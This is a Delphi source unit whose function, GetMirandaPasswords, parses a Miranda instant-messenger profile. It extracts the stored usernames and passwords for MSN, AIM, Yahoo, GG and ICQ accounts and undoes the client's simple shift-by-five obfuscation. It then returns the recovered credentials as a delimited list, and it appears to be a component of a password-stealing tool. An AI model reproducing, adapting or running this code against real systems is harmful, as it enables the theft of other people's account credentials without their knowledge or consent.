Unit Miranda;

interface

uses
  StrUtils,windows;
  
function GetMirandaPasswords(FileBuffer: string; Delimitador: string): String;

implementation

function IntToStr(i: Int64): String;
begin
  Str(i, Result);
end;

function StrToInt(S: String): Int64;
var
  E: integer;
begin
  Val(S, Result, E);
end;

function GetMirandaPasswords(FileBuffer: string; Delimitador: string): String;
var
  s, pass, tipo: string;
  i, j: integer;
begin
  result := '';
  s := FileBuffer;
  
  while posex('AM_BaseProto', s) > 0 do
  begin
    i := 0;
    j := 0;

    delete(s, 1, posex('AM_BaseProto', s) - 1);
    delete(s, 1, length('AM_BaseProto') + 1);

    copymemory(@i, @s[1], sizeof(byte));
    delete(s, 1, 2);
    tipo := Copy(s, 1, i);

    if (tipo = 'MSN') or (tipo = 'AIM') or (tipo = 'YAHOO') then
    begin
      Result := Result + 'Miranda: ' + Tipo + Delimitador;
      while s[2] <> #0 do delete(s, 1, 1);
      copymemory(@i, @s[1], sizeof(byte));
      delete(s, 1, 2);
      Result := Result + Copy(s, 1, i) + Delimitador;
      while s[2] <> #0 do delete(s, 1, 1);
      copymemory(@i, @s[1], sizeof(byte));
      delete(s, 1, 2);
      Pass := Copy(s, 1, i);

      for j := 1 To i do
      begin
        Pass[j] := char(ord(Pass[j]) - 5);
      end;

      Result := Result + Pass + Delimitador + #13#10;
    end else
    if (tipo = 'GG') then
    begin
      Result := Result + 'Miranda: ' + Tipo + Delimitador;
      delete(s, 1, posex('Password', s) - 1);
      delete(s, 1, length('Password') + 1);
      copymemory(@i, @s[1], sizeof(byte));
      delete(s, 1, 2);
      Pass := Copy(s, 1, i);
      for j := 1 To i do
      begin
        Pass[j] := char(ord(Pass[j]) - 5);
      end;

      while s[2] <> #0 do delete(s, 1, 1);
      copymemory(@i, @s[1], sizeof(byte));
      delete(s, 1, 2);

      Result := Result + Copy(s, 1, i) + Delimitador + Pass + Delimitador + #13#10;
    end else
    if (tipo = 'ICQ') then
    begin
      //Verificar erros
	  
      Result := Result + 'Miranda: ' + Tipo + Delimitador;

      delete(s, 1, posex('UIN', s) - 1);
      delete(s, 1, length('UIN') + 1);
      copymemory(@i, @s[1], sizeof(integer));
      delete(s, 1, sizeof(integer));

      Result := Result + IntToStr(i) + Delimitador;
      while char(ord(s[1])) <> #0 do delete(s, 1, 1);
      delete(s, 1, 1);

      Pass := Copy(s, 1, posex(#0, s) - 1);
      delete(s, 1, Length(Pass) + 1);

      for j := 1 To Length(pass) do
      begin
        Pass[j] := char(ord(Pass[j]) - 5);
      end;

      Result := Result + Pass + Delimitador + #13#10;
    end else
    begin
      //ms := tmemorystream.Create;
      //ms.Write(s[1], 100);
      //ms.Position := 0;
      //randomize;
      //ms.SaveToFile(inttostr(random(9999)) + '.txt');
      //ms.Free;
    end;
  end;
end;

end.
